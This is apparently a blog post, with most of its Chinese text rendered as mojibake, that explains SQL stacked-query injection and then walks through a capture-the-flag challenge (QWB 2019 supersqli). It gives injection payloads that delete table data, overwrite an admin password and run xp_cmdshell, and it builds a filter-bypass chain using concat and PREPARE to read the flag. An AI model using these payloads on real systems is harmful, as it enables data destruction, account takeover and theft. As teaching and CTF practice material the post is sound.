&lt;p&gt;å †å æ³¨å…¥ä¸ºæ”»å‡»è€…æä¾›äº†å¾ˆå¤§çš„æ§åˆ¶æƒã€‚ç”¨ç»“æŸåŸå§‹çš„æŸ¥è¯¢æ·»åŠ æ–°è¯­å¥çš„æ–¹å¼ï¼Œå°±å¯èƒ½å¯¹æ•°æ®è¿›è¡Œæ”¹åŠ¨ï¼Œæˆ–è€…æ‰§è¡Œç¨‹åºã€‚å¾ˆå¤šSQLæ³¨å…¥æ”»å‡»éƒ½æ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œäº†è§£ä»–çš„åŸç†å¯¹æ­£ç¡®äº†è§£è¿™ä¸€å®‰å…¨é—®é¢˜å¾ˆé‡è¦ã€‚&lt;/p&gt;

&lt;h2 id=&quot;principle&quot;&gt;Principle&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;In SQL, a semicolon indicates that the end of a statement has been reached and what follows is a new one. This allows executing multiple statements in the same call to the database server. Contrary to UNION attacks which are limited to SELECT statements, stacked queries can be used to execute any SQL statement or procedure. A classic attack using this technique could look like the following.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨SQLè¯­å¥ä¸­ï¼Œåˆ†å·æ„å‘³ç€ä¸€æ®µè¯­å¥çš„ç»“æŸï¼Œåé¢æ˜¯å¦ä¸€æ®µæ–°çš„è¯­å¥ï¼Œè¿™å°±å…è®¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­æ‰§è¡Œå¤šä¸ªè¯­å¥ã€‚ä¸UNIONæŸ¥è¯¢æ”»å‡»å¯¹SELECTçš„é™åˆ¶ç›¸åï¼Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œä»»ä½•çš„SQLè¯­å¥å’Œç¨‹åºï¼Œä¸€ä¸ªç»å…¸çš„æ”»å‡»åˆ©ç”¨å¦‚ä¸‹ã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MALICIOUS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;æ¶æ„ç”¨æˆ·è¾“å…¥&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MULTIPLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;THE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PARAMETER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRODUCTID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WAS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SANITIZED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;productid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;æ„æˆçš„æ¶æ„è¯­å¥&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;THE PARAMETER PRODUCTID WAS NOT SANITIZED.&lt;/code&gt;çš„æ„æ€æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;PRODUCTID&lt;/code&gt;å‚æ•°æœªæ¸…é™¤ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;When the query is executed, a product is returned by the first statement and all products are deleted by the second.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;è¯·æ±‚æ‰§è¡Œåï¼Œè¿”å›ç¬¬ä¸€ä¸ªè¯­å¥æŸ¥è¯¢çš„idä¸º1çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;ï¼Œç¬¬äºŒæ­¥åˆ é™¤è¡¨ä¸­æ‰€æœ‰å†…å®¹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;stacked-queries-limitations&quot;&gt;Stacked Queries Limitations&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;It is important to mention that query stacking does not work in every situation. Most of the time, this kind of attack is impossible because the API and/or database engine do not support this functionality. Insufficient rights could also explain why the attacker is unable to modify data or call some procedures.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å€¼å¾—ä¸€æçš„æ˜¯å †å æ³¨å…¥ä¸æ˜¯åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½å¯ä»¥ç”¨ï¼Œä¸æ”¯æŒçš„APIæˆ–æ•°æ®åº“å°±ä¸å¯ä»¥ç”¨ï¼Œæƒé™ä¸è¶³ä¹Ÿå¯èƒ½ä½¿å¾—ä¸èƒ½ä¿®æ”¹æ•°æ®æˆ–æ‰§è¡Œç¨‹åºã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Below is a list of query stacking support by the principal API and DBMS.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä»¥ä¸‹æ˜¯æ”¯æŒå †å æ³¨å…¥çš„APIæˆ–æ•°æ®åº“ã€‚&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;STACKED QUERY SUPPORT.

MySQL/PHP - Not supported (supported by MySQL for other API).

SQL Server/Any API - Supported.

Oracle/Any API - Not supported.
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;API and DBMS&lt;/th&gt;
      &lt;th&gt;SUPPORT&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MySQL/PHP&lt;/td&gt;
      &lt;td&gt;ä¸æ”¯æŒï¼Œæ”¯æŒMySQLå’Œå…¶ä»–API&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SQL Server/Any API&lt;/td&gt;
      &lt;td&gt;æ”¯æŒ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Oracle/Any API&lt;/td&gt;
      &lt;td&gt;ä¸æ”¯æŒ&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;Even though we mentioned earlier that stacked queries can add any SQL statement, this injection technique is frequently limited when it comes to adding SELECTs. Both statements will be executed but software code is usually designed to handle the results returned by only one query. Consequently, the injected SELECT query will often generate an error or its results will simply be ignored. For this reason it is recommended to use UNION attacks when trying to extract data.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å°½ç®¡æˆ‘ä»¬å‰é¢è¯´è¿‡å †å æ³¨å…¥å¯ä»¥æ·»åŠ ä»»æ„çš„SQLè¯­å¥ï¼Œä½†æ˜¯å¯¹äºæ·»åŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt;çš„è¯­å¥æ—¶ï¼Œè¿™ç§æ³¨å…¥æ–¹å¼ç»å¸¸å—é™ã€‚è™½ç„¶ä¸¤æ¡è¯­å¥éƒ½å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ç¨‹åºé€šå¸¸åªè¿”å›ä¸€ä¸ªè¯­å¥çš„æŸ¥è¯¢æ•°æ®ï¼Œæ³¨å…¥&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt;è¯­å¥ç»å¸¸ä¼šå‡ºé”™æˆ–è€…ç»“æœè¢«å¿½ç•¥ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;UNION&lt;/code&gt;æ³¨å…¥æå–æ•°æ®ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;One last thing needs to be mentionned: to inject a valid SQL segment, the attacker will need to know some basic information such as table names, column names, etc. For more information refer to the section dedicated to information gathering.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æœ€åéœ€è¦æé†’çš„æ˜¯æ³¨å…¥SQLæ—¶ï¼Œæ”»å‡»è€…éœ€è¦çŸ¥é“ä¸€äº›åŸºæœ¬çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®è¡¨åã€æ•°æ®åº“åˆ—åä¹‹ç±»çš„ã€‚æ›´å¤šçš„ä¿¡æ¯ï¼Œå‚ç…§ä¿¡æ¯æ”¶é›†çš„éƒ¨åˆ†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;altering-data&quot;&gt;Altering Data&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;The example presented at the beginning of the article demonstrates how query stacking can be used to delete information from the database. Instead of destroying data, attackers usually try to steal it or grant themselves high privileges on the system. A frequent approach is to change the administratorâ€™s password. The example below illustrates a classic data modification using SQL injection.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ–‡ç« å‰é¢çš„ä¾‹å­å±•ç¤ºäº†å †å æ³¨å…¥å¯ä»¥åˆ é™¤æ•°æ®åº“ä¿¡æ¯ï¼Œæ¯”èµ·è¿™ä¸ªï¼Œæ”»å‡»è€…é€šå¸¸ä¼šå°è¯•çªƒå–æ•°æ®ï¼Œæˆ–è€…æå‡è‡ªå·±çš„ç³»ç»Ÿæƒé™ã€‚ä¸€ä¸ªå¸¸è§„æ“ä½œå°±æ˜¯ä¿®æ”¹ç³»ç»Ÿç®¡ç†å‘˜çš„å¯†ç ï¼Œä¸‹é¢çš„ä¾‹å­å°†æ¼”ç¤ºä¸€ä¸ªç»å…¸çš„SQLæ³¨å…¥ä¿®æ”¹æ“ä½œã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pwd'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ç”¨æˆ·æ¶æ„è¾“å…¥&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;categoryid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pwd'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;æ„æˆçš„æ¶æ„è¯­å¥&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;calling-stored-procedures&quot;&gt;Calling Stored Procedures&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Calling a procedure can bring SQL injections attacks to a whole new level. Nowadays, many database management systems come with built in packages of functions and procedures to simplify development and provide new functionalities. Therefore, it becomes possible to communicate with network, control the operating system and do even more from a simple SQL statement.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ‰§è¡Œç¨‹åºå¯ä»¥æŠŠSQLæ³¨å…¥æ”»å‡»æé«˜ä¸€ä¸ªæ¡£æ¬¡ã€‚å¦‚ä»Šå¾ˆå¤šæ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¼šå°†æ–¹æ³•å’Œè¿‡ç¨‹æ‰“åŒ…ï¼Œä»¥ç®€åŒ–å¼€å‘ï¼Œæä¾›æ–°åŠŸèƒ½ï¼Œå› æ­¤å°±å¯èƒ½ä¸äº’è”ç½‘äº¤äº’ï¼Œé€šè¿‡ç®€å•çš„SQLè¯­å¥æ§åˆ¶æ“ä½œç³»ç»Ÿæˆ–è€…æ›´æ·±å…¥ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;As there is no convention between DBMS regarding to packages and procedures name, the attacker will have to identify which database system is used before trying to call a built-in procedure. From there, the principle is the same as examples presented earlier except that the injected query is a stored procedure call. Let see how it can be done with the use of xp_shellcmd; a SQL Serverâ€™s specific command which allows executing operating system calls.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç”±äºæ•°æ®åº“çš„åŒ…å’Œè¿‡ç¨‹åæ²¡æœ‰å…³è”ï¼Œå› æ­¤åœ¨æ‰§è¡Œç¨‹åºå‰æ”»å‡»è€…å¿…é¡»ç¡®å®šè¢«æ”»å‡»æ•°æ®åº“çš„ç§ç±»ã€‚è¿™ä¸ªåŸç†å’Œä¹‹å‰æåˆ°çš„ä¾‹å­ä¸­çš„éœ€è¦ç¡®å®šè¡¨åç­‰ä¿¡æ¯ä¸€æ ·ï¼Œåªä¸è¿‡æŸ¥è¯¢è¯­å¥æ˜¯æ‰§è¡Œå­˜å‚¨çš„ç¨‹åºã€‚&lt;code class=&quot;highlighter-rouge&quot;&gt;xp_shellcmd&lt;/code&gt;æ˜¯ä¸€ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Server&lt;/code&gt;çš„ç‰¹æ®Šè¯­å¥ï¼Œå¯ä»¥æ‰§è¡Œæ“ä½œç³»ç»Ÿç¨‹åºï¼Œæ¥çœ‹ä¸€ä¸‹æ‰§è¡Œç¨‹åºæ˜¯æ€ä¹ˆåšåˆ°çš„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DEL important_file.txt'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;ç”¨æˆ·æ¶æ„è¾“å…¥&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;categoryid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DEL important_file.txt'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;æ„æˆçš„æ¶æ„è¯­å¥&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;The query above will return a product list and delete â€œimportant_file.txtâ€. A much more complex attack could have been launched to take control over the operating system, but this is outside the scope of this article. The injected statement is not limited to built-in packages; a user-defined procedure could also be called. This approach is not frequent but it could be useful in some specific cases.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä»¥ä¸ŠæŸ¥è¯¢ä¼šè¿”å›&lt;code class=&quot;highlighter-rouge&quot;&gt;categoryid=1&lt;/code&gt;çš„äº§å“åˆ—è¡¨ï¼Œå¹¶åˆ é™¤&lt;code class=&quot;highlighter-rouge&quot;&gt;important_file.txt&lt;/code&gt;ï¼Œæ›´å¤æ‚çš„æ”»å‡»å¯èƒ½ä¼šè·å¾—æ“ä½œç³»ç»Ÿçš„æ§åˆ¶ï¼Œä½†æ˜¯è¿™è¶…å‡ºäº†è¿™ç¯‡æ–‡ç« çš„èŒƒå›´ã€‚æ³¨å…¥è¯­å¥ä¹Ÿä¸é™äºå†…ç½®çš„åŒ…ï¼Œç”¨æˆ·è‡ªå®šä¹‰çš„ç¨‹åºä¹Ÿå¯èƒ½è¢«åˆ©ç”¨æ‰§è¡Œï¼Œè¿™ä¸ªæ”»å‡»æ–¹æ³•ä¸æ˜¯å¾ˆæ™®é€‚ä½†åœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹æ˜¯æœ‰ç”¨çš„ã€‚&lt;/p&gt;

&lt;h1 id=&quot;ein-beispiel&quot;&gt;Ein Beispiel&lt;/h1&gt;

&lt;p&gt;ä¸€ä¸ªä¾‹å­æ¥è‡ªå¼ºç½‘æ¯2019ï¼Œ&lt;a href=&quot;https://github.com/CTFTraining/qwb_2019_supersqli&quot;&gt;å¤ç°ç¯å¢ƒ&lt;/a&gt;ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;clone&lt;/code&gt;æ”¾åˆ°&lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt;é‡Œï¼Œå¯åŠ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¾“å…¥ä¸€ä¸ªå°å°çš„å•å¼•å·&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æŠ¥é”™äº†ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' or '1'='1 #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¿”å›äº†ä¸€äº›æ•°æ®ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´æ— ç–‘&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' order by 3 # 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿”å›é”™è¯¯&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' order by 2 # 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¿”å›æ­£ç¡®ï¼Œå¯ä»¥åˆ¤æ–­è¯¥è¡¨æœ‰ä¸¤åˆ—&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1' union select 1,2 #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;select&lt;/code&gt;å…³é”®è¯è¢«è¿‡æ»¤äº†ï¼ŒåŠ &lt;code class=&quot;highlighter-rouge&quot;&gt;/**/&lt;/code&gt;ï¼Œæ›¿æ¢å¤§å°å†™éƒ½ä¸èƒ½ç»•è¿‡å»ã€‚&lt;/p&gt;

&lt;p&gt;è¿™æ—¶å°è¯•å †å æ³¨å…¥ï¼Œå°è¯•åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show databases; #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/6.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ‰&lt;code class=&quot;highlighter-rouge&quot;&gt;ctftraining&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;performance_schema&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;supersqli&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;6ä¸ªæ•°æ®åº“&lt;/p&gt;

&lt;p&gt;å°è¯•åˆ—å‡ºå½“å‰æ•°æ®åº“çš„è¡¨ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show tables; #
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/7.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ‰&lt;code class=&quot;highlighter-rouge&quot;&gt;1919810931114514&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;words&lt;/code&gt;ä¸¤ä¸ªè¡¨ã€‚&lt;/p&gt;

&lt;p&gt;å°è¯•è·å–è¡¨çš„åˆ—åï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show columns from words;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/9.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';show columns from `1919810931114514`;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/8.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹æ¥å°±è¦è¯»å–æ•°æ®äº†ï¼Œä½†æ˜¯å…³é”®è¯éƒ½è¢«è¿‡æ»¤äº†ã€‚&lt;/p&gt;

&lt;p&gt;çœ‹åˆ°ä¸¤ç§è§£é¢˜æ€è·¯ï¼Œä¸€ç§æ˜¯æŠŠå…³é”®è¯åˆ†å¼€å†™ç„¶åæ‹¼æ¥ï¼Œä¸€ç§æ˜¯å°†1919810931114514é‡å‘½åä¸ºwordsï¼Œå°†flagæ”¹ä¸ºidã€‚æ„Ÿè§‰é‡å‘½åäº†ä»¥åå°±ç®—æ˜¯ä¿®æ”¹äº†åŸæœ¬æ•°æ®ï¼Œæ‰€ä»¥é€‰æ‹©æ‹¼æ¥å…³é”®è¯çš„æ–¹æ³•ã€‚&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200407_sqli_stacked_queries/10.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ€è·¯&quot;&gt;æ€è·¯&lt;/h2&gt;

&lt;p&gt;ğŸ’åŠ å•å¼•å·è¯•æ¢ï¼Œæœ‰æ—¶å€™ä¹Ÿå¯ä»¥è¯•ä¸€ä¸‹æ²¡æœ‰å•å¼•å·æˆ–è€…æ‹¬å·æˆ–è€…åŒå¼•å·ï¼ŒåŸç†å°±æ˜¯å°è¯•é—­åˆå‰ä¸€ä¸ªè¯­å¥&lt;/p&gt;

&lt;p&gt;ğŸ’åˆ¤æ–­åˆ—æ•°ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;order by&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ğŸ’select åˆ—æ•°ï¼Œå‘ç°å…³é”®å­—è¢«è¿‡æ»¤ï¼Œå°è¯•å †å æ³¨å…¥&lt;/p&gt;

&lt;p&gt;ğŸ’åˆ—å‡ºæ•°æ®åº“å&lt;/p&gt;

